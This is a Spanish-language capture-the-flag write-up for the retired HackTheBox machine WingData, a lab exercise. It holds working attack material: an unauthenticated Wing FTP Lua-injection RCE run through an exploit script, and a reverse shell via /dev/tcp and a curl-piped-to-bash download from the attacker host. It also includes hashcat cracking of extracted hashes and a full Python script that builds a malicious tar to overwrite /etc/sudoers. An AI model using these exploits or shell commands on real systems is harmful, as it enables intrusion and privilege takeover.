---
title: "WingData — HackTheBox (Easy)"
machine: "WingData"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
tags: ["CVE", "RCE", "Privesc", "FTP", "Web"]
retired: true
summary: "WingData es una máquina Linux de dificultad Easy en HackTheBox. Aloja un sitio web corporativo de soluciones de transferencia de archivos y un servidor Wing FTP"
draft: false
---
**Autor:**  ****4Pr3nd1z**

**Dificultad:** Easy · Linux

**Fecha:** Mayo 2026

**XP:** 585

---

## Índice

---

## Descripción General

WingData es una máquina Linux de dificultad Easy en HackTheBox. Aloja un sitio web corporativo de soluciones de transferencia de archivos y un servidor **Wing FTP Server v7.4.3** expuesto como portal de clientes en un subdominio.

La cadena de ataque abarca explotación de un RCE sin autenticación (CVE-2025-47812) vía inyección Lua en Wing FTP, extracción y crackeo de credenciales con sal conocida del producto, y escalada de privilegios mediante path traversal en un script Python con permisos sudo que usa `tarfile.extractall()`.

**Tecnologías clave:** Apache, Wing FTP Server, Python, tarfile, SHA-256 salteado

---

## Reconocimiento

### Escaneo Nmap

```bash
sudo nmap 10.129.244.106 -p- --open --min-rate 5000 -Pn -n -oG target
sudo nmap 10.129.244.106 -p 22,80 -sCV -Pn -oN targeted
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
```

Solo dos puertos abiertos. El servicio HTTP redirige a `wingdata.htb`.

```bash
echo "10.129.244.106 wingdata.htb" | sudo tee -a /etc/hosts
whatweb http://wingdata.htb/
# Bootstrap, jQuery, Apache 2.4.66 — WingData Solutions
```

### Análisis del Código Fuente Web

Revisando el HTML de la página principal se descubre un enlace en el menú de navegación que apunta directamente al subdominio del portal de clientes:

```html
<li>
  <div class="main-red-button">
    <a href="http://ftp.wingdata.htb/">Client Portal</a>
  </div>
</li>
```

> **Nota:** El subdominio fue descubierto leyendo el HTML manualmente, sin necesidad de fuzzing.
> 

```bash
sudo sed -i 's/wingdata.htb/wingdata.htb ftp.wingdata.htb/' /etc/hosts
```

---

## Análisis del Subdominio FTP

```bash
whatweb http://ftp.wingdata.htb/
# Wing-FTP-Server[Free Edition]
```

El subdominio expone un **Wing FTP Server v7.4.3 (Free Edition)** con interfaz web en el puerto 80. El servidor FTP nativo (puerto 21) no está expuesto externamente — toda la interacción es vía HTTP.

```
http://ftp.wingdata.htb/ → Panel de login del cliente Wing FTP
```

Panel de administración disponible internamente en `127.0.0.1:5466`.

---

## Explotación — CVE-2025-47812 (Unauthenticated RCE)

### Descripción de la Vulnerabilidad

Wing FTP Server versiones anteriores a 7.4.4 son vulnerables a RCE sin autenticación. La vulnerabilidad surge del manejo incorrecto de **NULL bytes** en el parámetro `username` durante el login, lo que permite inyectar código Lua en los archivos de sesión. Estos archivos son ejecutados cuando se accede a `/dir.html` con la cookie `UID` correspondiente.

**Flujo del exploit:**

1. POST a `/loginok.html` con `username=anonymous%00]]<LUA_CODE>`
2. El servidor crea la sesión con el código Lua sin sanitizar
3. GET a `/dir.html` con la cookie `UID` → ejecuta el Lua → RCE

### Obtención del Exploit

```bash
searchsploit "Wing FTP"
searchsploit -m multiple/remote/52347.py
```

### Verificación de RCE

```bash
python3 52347.py -u http://ftp.wingdata.htb -c "whoami" -v
# Output: wingftp
```

### Reverse Shell

```bash
# Crear script de shell
echo 'bash -i >& /dev/tcp/10.10.16.59/4444 0>&1' > shell.sh
python3 -m http.server 8080

# Listener
penelope 4444

# Ejecutar exploit
python3 52347.py -u http://ftp.wingdata.htb -c "curl http://10.10.16.59:8080/shell.sh|bash"
```

```
[+] [New Reverse Shell] => wingdata 10.129.244.106 Linux-x86_64
[+] Session ID <1> — wingftp(1000)
wingftp@wingdata:/opt/wftpserver$
```

---

## Enumeración Post-Explotación

### Directorio de Wing FTP Server

```bash
ls -la /opt/wftpserver/
```

Archivos de interés:

| Archivo | Descripción |
| --- | --- |
| `Data/1/users/*.xml` | Usuarios y hashes del servidor FTP |
| `Data/_ADMINISTRATOR/admins.xml` | Hash del admin del panel |
| `wftp_default_ssh.key` | Clave privada SSH del servidor (no de usuario del sistema) |
| `Log/` | Logs de dominio, admin y SSH |

### Usuarios del Sistema

```bash
cat /etc/passwd | grep -v nologin | grep -v false
# root:x:0:0:root:/root:/bin/bash
# wingftp:x:1000:1000:..:/opt/wingftp:/bin/bash
# wacky:x:1001:1001:..:/home/wacky:/bin/bash
```

Dos usuarios con shell: `wingftp` (actual) y `wacky` (objetivo).

### Extracción de Hashes

```bash
cat Data/1/users/wacky.xml | grep Password
# 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca

cat Data/_ADMINISTRATOR/admins.xml | grep Password
# a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
```

Todos los usuarios FTP y sus hashes:

| Usuario | Hash SHA-256 |
| --- | --- |
| wacky | `32940defd...` |
| admin | `a8339f8e...` |
| john | `c1f14672...` |
| maria | `a70221f3...` |
| steve | `5916c748...` |

### Servicios Internos (desde logs)

```
Puerto 21   → FTP (127.0.0.1)
Puerto 5466 → Panel Admin Wing FTP (127.0.0.1)
Puerto 8080 → HTTP interno (127.0.0.1)
```

---

## Crackeo de Credenciales

### Identificación del Esquema de Hash

Wing FTP Server usa `SHA-256` con un salt fijo hardcodeado en el binario: **`WingFTP`**

El modo de hashcat correspondiente es **1410** (`sha256($pass.$salt)`).

```bash
cat > hashes.txt << 'EOF'
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba:WingFTP
EOF

hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
Status: Cracked
```

**Credenciales obtenidas:**

| Usuario | Contraseña |
| --- | --- |
| wacky | `!#7Blushing^*Bride5` |

---

## Flag de Usuario

```bash
ssh wacky@10.129.244.106
# password: !#7Blushing^*Bride5

cat ~/user.txt
# 403cd427626e8aeb36c4d296e0918c36
```

---

## Escalada de Privilegios — Tar Symlink Path Traversal

### Enumeración Sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

### Análisis del Script

El script `/opt/backup_clients/restore_backup_clients.py` acepta dos argumentos:

- `b` → nombre del archivo tar (debe coincidir con `backup_\d+\.tar`)
- `r` → directorio de restauración (debe comenzar con `restore_`)

La parte vulnerable:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

Aunque se usa `filter="data"`, la implementación en Python es vulnerable a un ataque de **path traversal vía symlinks con nombres de directorio largos** (247 caracteres), que permite escapar del directorio de extracción y escribir en rutas arbitrarias del sistema.

### Construcción del Tar Malicioso

El exploit construye una estructura de symlinks anidados que, al ser procesada por `tarfile.extractall`, resulta en la escritura del archivo final fuera del directorio destino — en este caso, sobrescribiendo `/etc/sudoers`.

```python
python3 << 'EOF'
import tarfile, os, io

def create_malicious_tar(output_path="/tmp/backup_9999.tar"):
    long_dir_name = 'd' * 247
    step_chars = "abcdefghijklmnop"
    current_path = ""
    with tarfile.open(output_path, mode="w") as tar:
        for char in step_chars:
            # Crear directorio largo
            dir_info = tarfile.TarInfo(os.path.join(current_path, long_dir_name))
            dir_info.type = tarfile.DIRTYPE
            tar.addfile(dir_info)
            # Symlink → directorio largo
            symlink_info = tarfile.TarInfo(os.path.join(current_path, char))
            symlink_info.type = tarfile.SYMTYPE
            symlink_info.linkname = long_dir_name
            tar.addfile(symlink_info)
            current_path = os.path.join(current_path, long_dir_name)
        # Construir path de traversal
        link_path = os.path.join("/".join(step_chars), "l"*254)
        link_info = tarfile.TarInfo(link_path)
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "../" * len(step_chars)
        tar.addfile(link_info)
        # Escape hacia /etc
        escape_info = tarfile.TarInfo("escape")
        escape_info.type = tarfile.SYMTYPE
        escape_info.linkname = f"{link_path}/../../../../../../../etc"
        tar.addfile(escape_info)
        # Hard link a /etc/sudoers
        sudoers_link_info = tarfile.TarInfo("sudoers_link")
        sudoers_link_info.type = tarfile.LNKTYPE
        sudoers_link_info.linkname = "escape/sudoers"
        tar.addfile(sudoers_link_info)
        # Contenido malicioso
        malicious_content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
        file_info = tarfile.TarInfo("sudoers_link")
        file_info.size = len(malicious_content)
        tar.addfile(file_info, fileobj=io.BytesIO(malicious_content))
    print(f"[+] Tar generado: {output_path}")

create_malicious_tar()
EOF
```

### Ejecución

```bash
# Copiar al directorio de backups
cp /tmp/backup_9999.tar /opt/backup_clients/backups/

# Ejecutar con sudo → sobrescribe /etc/sudoers
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar -r restore_evil

# Verificar
sudo -l
# (ALL) NOPASSWD: ALL ✓

# Escalar
sudo su
```

---

## Flag de Root

```bash
root@wingdata:/home/wacky# cat /root/root.txt
633ccd2cccf04efed24ee00173c0fa5b
```

---

## Resumen de la Cadena de Ataque

```
Código fuente HTML
       │
       ▼
Subdominio ftp.wingdata.htb (Wing FTP Server v7.4.3)
       │
       ▼
CVE-2025-47812 — NULL byte + Lua injection → RCE como wingftp
       │
       ▼
Data/1/users/wacky.xml → Hash SHA-256 con salt "WingFTP"
       │
       ▼
hashcat -m 1410 → !#7Blushing^*Bride5
       │
       ▼
SSH como wacky → user.txt ✓
       │
       ▼
sudo python3 restore_backup_clients.py (tarfile.extractall)
       │
       ▼
Tar malicioso — symlink path traversal → sobrescribe /etc/sudoers
       │
       ▼
sudo su → root.txt ✓
```

---

## Herramientas Utilizadas

- `nmap` — Escaneo de puertos y servicios
- `whatweb` — Fingerprinting web
- `searchsploit` — Búsqueda de exploits (CVE-2025-47812)
- `penelope` — Handler de reverse shells con upgrade automático a PTY
- `hashcat` — Crackeo de hashes (modo 1410, sha256 salteado)
- `Python 3` — Construcción del tar malicioso
- `chisel` — Port forwarding (explorado, descartado)

---

**Etiquetas**

`wing-ftp` `cve-2025-47812` `lua-injection` `null-byte` `rce` `sha256-salt` `hashcat` `tarfile` `path-traversal` `symlink` `sudo-abuse` `python` `easy` `linux`

---

*Writeup por* **4Pr3nd1z** *— Mayo 2026*
